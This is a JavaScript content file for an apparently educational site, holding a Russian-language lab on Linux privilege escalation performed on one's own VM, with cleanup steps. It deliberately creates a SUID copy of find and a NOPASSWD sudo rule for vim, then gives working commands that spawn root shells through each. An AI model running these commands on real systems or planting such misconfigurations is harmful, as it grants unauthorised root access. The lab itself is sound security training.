// ============ practice/lab-10.js — ЛАБОРАТОРНАЯ: ЭСКАЛАЦИЯ ПРИВИЛЕГИЙ ============

KERNEL_DATA.addPractice({
    id: 110,
    section: 'practice',
    title: 'Лабораторная: чек-лист эскалации привилегий на своей ВМ',
    desc: 'Специально создаём уязвимую конфигурацию (SUID-бинарник, слабый sudo) на своей ВМ и проходим её собственным чек-листом.',
    tags: ['практика', 'privesc', 'Linux', 'CTF'],
    date: 'Август 2026',
    content: function() {
        return [
            '<h3>Цель</h3>',
            '<p>На собственной виртуальной машине создать типичные ошибки конфигурации и найти их тем же методом, что применяется на CTF-машинах и реальных пентестах. Теория — в конспекте <a href="javascript:void(0)" onclick="App.openNote(\'notes\', 17)">«Эскалация привилегий в Linux»</a>.</p>',

            '<h3>Шаг 1. Создаём тестового пользователя с ограниченными правами</h3>',
            App.createCodeBlock(
                'sudo adduser testuser\nsu - testuser   # переключаемся, чтобы работать от его имени дальше',
                'bash'
            ),

            '<h3>Шаг 2. Намеренно создаём уязвимый SUID-бинарник</h3>',
            '<p>Выполните из-под администратора (не из-под testuser):</p>',
            App.createCodeBlock(
                'sudo cp /usr/bin/find /usr/local/bin/find_vuln\nsudo chmod u+s /usr/local/bin/find_vuln',
                'bash'
            ),

            '<h3>Шаг 3. От имени testuser находим и эксплуатируем</h3>',
            App.createCodeBlock(
                'find / -perm -4000 -type f 2>/dev/null | grep find_vuln\n\n# Эксплуатация:\nfind_vuln . -exec /bin/sh -p \\; -quit\nwhoami   # должно показать root, если сработало',
                'bash'
            ),

            '<h3>Шаг 4. Намеренно создаём уязвимую sudo-конфигурацию</h3>',
            '<p>От администратора добавьте в конец файла через <code>sudo visudo</code>:</p>',
            App.createCodeBlock('testuser ALL=(ALL) NOPASSWD: /usr/bin/vim', 'plaintext'),
            '<p>От testuser:</p>',
            App.createCodeBlock(
                'sudo -l                       # видим разрешённую команду\nsudo vim -c \':!/bin/sh\'        # выходим в root-шелл через vim',
                'bash'
            ),

            '<h3>Шаг 5. Убираем за собой</h3>',
            '<p>Важно откатить оба намеренных изменения после лабораторной — не оставляйте такие дыры в системе, даже учебной:</p>',
            App.createCodeBlock(
                'sudo rm /usr/local/bin/find_vuln\nsudo visudo   # удалить добавленную строку про vim',
                'bash'
            ),

            '<h3>Самопроверка</h3>',
            '<ul>',
            '<li>Вы получили root-шелл через SUID-бинарник, будучи testuser.</li>',
            '<li>Вы получили root-шелл через sudo-конфигурацию, не зная пароль root.</li>',
            '<li>Вы можете объяснить своими словами, чем принципиально отличаются эти два вектора.</li>',
            '<li>Вы убрали за собой обе намеренные уязвимости.</li>',
            '</ul>'
        ].join('');
    }
});
